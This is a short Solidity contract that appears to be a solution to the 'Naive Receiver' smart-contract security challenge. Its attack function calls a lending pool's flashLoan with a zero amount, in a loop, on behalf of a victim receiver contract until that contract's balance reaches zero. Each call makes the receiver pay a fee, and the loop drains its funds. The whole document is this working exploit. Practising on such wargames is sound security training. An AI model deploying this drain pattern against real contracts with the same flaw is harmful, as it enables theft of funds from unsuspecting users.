// SPDX-License-Identifier: Unlicense
pragma solidity ^0.8.0;

// import "hardhat/console.sol";

interface INaiveReceiverLenderPool {
    function flashLoan(address borrower, uint256 borrowAmount) external;
}

contract NaiveReceiverChallenge {
    function attack(address _receiver, address _pool) external {
        while(_receiver.balance > 0) {
            INaiveReceiverLenderPool(_pool).flashLoan(_receiver, 0);
        } 
    }
}